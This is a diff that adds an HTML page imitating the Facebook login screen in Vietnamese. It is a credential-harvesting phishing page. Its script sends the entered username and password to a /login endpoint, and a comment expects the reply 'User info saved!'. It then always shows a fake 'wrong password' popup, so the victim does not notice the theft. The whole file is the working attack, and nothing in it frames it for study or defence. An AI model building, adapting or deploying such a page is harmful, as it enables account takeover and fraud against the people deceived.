@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .fb-logo {
+            font-size: 48px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-top: 60px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 90%;
+            max-width: 360px;
+            padding: 14px;
+            margin: 6px 0;
+            border-radius: 12px;
+            border: 1px solid #dddfe2;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+
+        button.login-btn {
+            width: 90%;
+            max-width: 360px;
+            padding: 10px;
+            margin-top: 10px;
+            background: #1463ca;
+            color: white;
+            border: none;
+            border-radius: 32px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button.login-btn:hover {
+            background: #166fe5;
+        }
+
+        button.forgot-btn {
+            margin-top: 12px;
+            background: none;
+            border: none;
+            color: #000000;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        button.forgot-btn:hover {
+            text-decoration: underline;
+        }
+
+        button.create-btn {
+            width: 90%;
+            max-width: 360px;
+            padding: 10px;
+            margin-top: 40px;
+            background: none;
+            color: rgb(62, 139, 190);
+            border: 2px solid rgb(42, 127, 183);
+            border-radius: 42px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button.create-btn:hover {
+            color: rgb(73, 155, 209);
+            border: 2px solid rgb(73, 155, 209);
+        }
+
+        .meta-logo {
+            font-size: 18px;
+            color: #65676b;
+            margin-top: 50px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links {
+            font-size: 12px;
+            color: #65676b;
+            margin-bottom: 30px;
+        }
+
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        #error-popup {
+            display: none; 
+            position: absolute;
+            top: 180px;
+            width: 85%; 
+            max-width: 300px; 
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+            padding: 0; 
+            z-index: 1000;
+            overflow: hidden;
+        }
+
+        #error-popup .section {
+            padding: 10px 15px;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        #error-popup .section.bold {
+            font-weight: bold;
+            font-size: 16px;
+            color: #000;
+            margin-top: 10px;
+        }
+
+        #error-popup .section.info {
+            font-weight: normal;
+            font-size: 14px;
+            color: #65676b;
+            margin-top: -12px;
+            margin-bottom: 12px;
+        }
+
+        #error-popup .popup-buttons {
+            display: flex;
+            flex-direction: column;
+        }
+
+        #error-popup .popup-buttons button {
+            width: 100%;
+            padding: 12px 0;
+            background: none;
+            border: none;
+            border-top: 1px solid #ddd;
+            color: #1877f2;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        #error-popup .popup-buttons button:hover {
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="fb-logo">facebook</div>
+
+    <input id="username" type="text" placeholder="Số di động hoặc email">
+    <input id="password" type="password" placeholder="Mật khẩu">
+    <button class="login-btn" onclick="login()">Đăng nhập</button>
+    <button class="forgot-btn">Quên mật khẩu?</button>
+    <button class="create-btn">Tạo tài khoản mới</button>
+
+    <div class="meta-logo">Meta</div>
+    <div class="footer-links">
+        <a href="#">Giới thiệu</a> · 
+        <a href="#">Trợ giúp</a> · 
+        <a href="#">Xem thêm</a>
+    </div>
+
+    <div id="error-popup">
+        <div class="section bold">Sai mật khẩu</div>
+        <div class="section info">Chúng tôi có thể hỗ trợ bạn đăng nhập vào tài khoản trong trường hợp bạn quên mật khẩu.</div>
+        <div class="popup-buttons">
+            <button onclick="forgotPassword()">Quên mật khẩu</button>
+            <button onclick="tryAgain()">Thử lại</button>
+        </div>
+    </div>
+
+<script>
+function login() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    showErrorPopup();
+
+    fetch("/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+    })
+    .then(res => res.json())
+    .then(data => {
+        console.log(data.message); // should say "User info saved!"
+        showErrorPopup(); // popup always shows
+    });
+}
+
+function showErrorPopup() {
+    const popup = document.getElementById("error-popup");
+    popup.style.display = "block";
+}
+
+function tryAgain() {
+    const popup = document.getElementById("error-popup");
+    popup.style.display = "none";
+    document.getElementById("password").value = "";
+}
+
+function forgotPassword() {
+}
+</script>
+
+</body>
+</html>
